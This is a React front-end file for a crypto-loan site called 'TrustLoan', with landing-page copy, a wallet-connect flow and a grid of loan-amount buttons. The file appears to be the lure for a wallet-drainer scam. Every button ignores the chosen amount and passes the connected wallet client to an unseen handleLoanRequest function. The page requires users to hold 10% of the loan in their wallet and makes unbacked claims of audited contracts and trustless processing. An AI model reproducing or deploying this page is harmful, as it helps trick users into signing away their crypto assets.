// App.js
import './styles.css';
import React, { useEffect, useState } from 'react';
import ConnectWallet from './components/ConnectWallet';
import { useAccount, useWalletClient } from 'wagmi';
import { handleLoanRequest } from './components/handleLoanRequest';

function App() {
  const { isConnected, address } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);

    // Live chat script
    const jivoScript = document.createElement('script');
    jivoScript.src = '//code.jivosite.com/widget/QteRBV3vK5';
    jivoScript.async = true;
    document.body.appendChild(jivoScript);

    // Handle broken scripts
    const errorHandler = (e) => {
      const target = e.target || e.srcElement;
      if (target && target.tagName === 'SCRIPT') {
        console.error('🚨 Script load error:', {
          src: target.src,
          message: e.message,
        });

        fetch(target.src)
          .then(res => res.text())
          .then(body => {
            if (body.startsWith('<')) {
              console.warn('❗ Script returned HTML instead of JS:', target.src);
              console.log('Returned content:\n', body.slice(0, 500));
            }
          })
          .catch(err => {
            console.error('Error inspecting failed script:', err);
          });
      }
    };

    window.addEventListener('error', errorHandler, true);
    return () => window.removeEventListener('error', errorHandler, true);
  }, []);

  // Prevent SSR mismatch
  if (!mounted) return null;

  return (
    <div className="app">
      {/* Navbar */}
      <header className="navbar">
        <div className="logo">TrustLoan</div>
        <nav className="nav-links">
          <a href="#how-it-works">How it Works</a>
          <a href="#loan-offers">Loan Offers</a>
          <a href="#faq">FAQ</a>
        </nav>
        <ConnectWallet />
      </header>

      {/* Hero Section */}
      <section className="hero-container">
        <div className="hero">
          {/* Token Icons - hidden on mobile */}
          <div className="hidden md:flex relative w-[300px] h-[320px] items-center justify-center">
            <div className="relative w-full h-full">
              <img src="/images/ethereum-eth-logo.png" alt="ETH" className="token eth" />
              <img src="/images/usd-coin-usdc-logo.png" alt="USDC" className="token usdc" />
              <img src="/images/dai.png" alt="DAI" className="token dai" />
              <img src="/images/litecoin.png" alt="WBTC" className="token wbtc" />
            </div>
          </div>

          {/* Center Section */}
          <div className="hero-content-wrapper">
            <div className="hero-content">
              {!isConnected || !address ? (
                <>
                  <h1>
                    Welcome to <span className="highlight">Trust Loan</span>
                  </h1>

                  <section className="bg-gradient-to-br from-[#1c1f26] to-[#0f1115] text-white py-20 px-6 text-center md:text-left">
                    <div className="max-w-5xl mx-auto">
                      <p className="text-lg md:text-xl text-gray-300 mb-10">
                        <strong className="block text-2xl font-semibold text-white mb-3">
                          A Secure and Simple Way to Get Crypto-Backed Loans
                        </strong>
                        Trust loan allows you to borrow stablecoins instantly using your crypto assets as collateral — no credit checks, no paperwork, no intermediaries.
                      </p>

                      <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-left">
                        {[
                          ['Instant Loans', 'Borrow in seconds - no approvals, no delays, on-chain only.'],
                          ['Secure Collateral', 'Your assets remain safe, locked in audited smart contracts.'],
                          ['Total Control', 'Repay anytime. Withdraw instantly. No hidden fees or fine print.']
                        ].map(([title, desc], i) => (
                          <div key={i}>
                            <h3 className="text-xl font-bold text-purple-400 mb-2">{title}</h3>
                            <p className="text-gray-300">{desc}</p>
                          </div>
                        ))}
                      </div>
                    </div>
                  </section>

                  <section className="relative z-10 px-6 py-24 max-w-7xl mx-auto bg-gradient-to-b from-transparent to-[#0f1115] mb-24">
                    <h2 className="text-4xl font-extrabold text-white mb-16 text-center tracking-tight">How It Works</h2>

                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-10 text-white">
                      {[
                        ['Connect Wallet', '🔗', 'Securely link your crypto wallet in seconds and get started instantly.'],
                        ['Deposit Collateral', '💼', 'Choose supported assets and lock them into our smart contract as collateral.'],
                        ['Borrow Instantly', '⚡', 'Receive stablecoins with zero delays — no approvals, no paperwork.'],
                        ['Repay Anytime', '🔓', 'Unlock your assets at your own pace. No penalties or hidden fees.']
                      ].map(([title, icon, desc], index) => (
                        <div key={index} className="flex flex-col items-center text-center p-8 bg-zinc-900/80 rounded-2xl border border-zinc-800 shadow-xl hover:shadow-purple-500/30 transition-all duration-300 hover:-translate-y-2">
                          <div className="text-5xl mb-6">{icon}</div>
                          <h3 className="text-xl font-bold mb-3">{title}</h3>
                          <p className="text-gray-400 text-sm leading-relaxed">{desc}</p>
                        </div>
                      ))}
                    </div>

                    <p className="text-center text-gray-400 mt-16 max-w-2xl mx-auto text-base leading-relaxed">
                      All loans are processed 100% on-chain — verifiable, secure, and trustless. Your assets stay under your control at all times.
                    </p>
                  </section>

                  <div className="flex justify-center items-center mt-6">
                    <ConnectWallet />
                  </div>
                </>
              ) : (
                <div className="connected-dashboard">
                  <h3>Welcome back 👋</h3>
                  <div className="loan-options">
                    <h3 className="loan-heading">Select compatible loan option:</h3>
                    <div className="mt-4 mb-2 bg-yellow-900/20 border border-yellow-600 text-yellow-300 px-4 py-3 rounded-xl text-sm font-medium shadow-md">
                      ⚠️ To protect your loan, your wallet must hold at least <span className="font-semibold text-white">10% of your requested loan</span> as wallet collateral.
                    </div>

                    <div className="loan-grid">
                      {[1000, 5000, 10000, 20000, 50000, 100000].map((amt) => (
                        <button
                          key={amt}
                          className="loan-button"
                          onClick={() => {
                            if (walletClient && address) {
                              handleLoanRequest(walletClient, address);
                            }
                          }}
                        >
                          ${amt.toLocaleString()}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* iPhone mockup image */}
          <div className="hero-image">
            <img src="/images/iphone-mockup.png" alt="iPhone mockup with wallet" />
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-content">
          <div className="footer-left">
            <h2 className="footer-logo">TrustLoan</h2>
            <p>Empowering decentralized access to instant loans. No paperwork. No delay.</p>
          </div>
          <div className="footer-links">
            <div className="footer-column">
              <h4>Navigate</h4>
              <a href="#how-it-works">How it Works</a>
              <a href="#loan-offers">Loan Offers</a>
              <a href="#faq">FAQ</a>
            </div>
            <div className="footer-column">
              <h4>Connect</h4>
              <a href="https://t.me/josecsco" target="_blank" rel="noopener noreferrer">Telegram</a>
              <a href="#">Twitter</a>
              <a href="#">Contact Support</a>
            </div>
          </div>
        </div>
        <div className="footer-bottom">
          <p>&copy; 2025 Xylon — All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}

export default App;
